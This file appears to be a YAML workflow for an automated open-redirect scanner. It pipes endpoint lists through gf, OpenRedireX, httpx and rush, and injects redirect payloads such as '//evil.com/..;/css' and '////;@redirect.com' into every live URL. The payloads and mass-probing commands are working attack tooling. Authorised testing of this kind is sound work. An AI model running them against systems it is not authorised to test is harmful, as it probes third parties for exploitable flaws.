vars:
  OUTPUT_ALIVE_ENDPOINTS: "aliveEndpoints"
  OUTPUT_OPEN_REDIRECT_FUZZ: "openRedirectFuzz"
  OUTPUT_OPENREDIREX_GF: "GFopenRedireX"
  OUTPUT_OPEN_REDIRECT_HTTPX: "openRedirectHttpx"
  OUTPUT_OPEN_REDIRECT_RUSH: "openRedirectRush"
  OUTPUT_OPENREDIREX: "openRedireX"
  
parallel: false
modules:
  - name: Open Redirect Module
    cmds:
      - cat {{OUTPUT_ALIVE_ENDPOINTS}} | gf redirect | grep "=" | qsreplace FUZZ | tee {{OUTPUT_OPEN_REDIRECT_FUZZ}}; python3 ~/Tools/OpenRedireX/ openredirex.py -l {{OUTPUT_OPEN_REDIRECT_FUZZ}} -p ~/Wordlists/payloadsOpenRedirect.txt --keyword FUZZ | tee {{OUTPUT_OPENREDIREX_GF}}
      - cat {{OUTPUT_ALIVE_ENDPOINTS}} | gf redirect | httpx -silent -path "//evil.com/..;/css" -mc 302 -status-code -match-string "Location://evil.com/..;/css" | tee {{OUTPUT_OPEN_REDIRECT_HTTPX}}
      - cat {{OUTPUT_ALIVE_ENDPOINTS}} | gf redirect | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi' | tee {{OUTPUT_OPEN_REDIRECT_RUSH}}
      - cat {{OUTPUT_ALIVE_ENDPOINTS}} | openredirex | grep 'FOUND' | tee {{OUTPUT_OPENREDIREX}}
    silent: true
    
  - name: Sending Notification
    cmds:
      - echo "Open Redirect Methods (4) Finished" | notify
    silent: true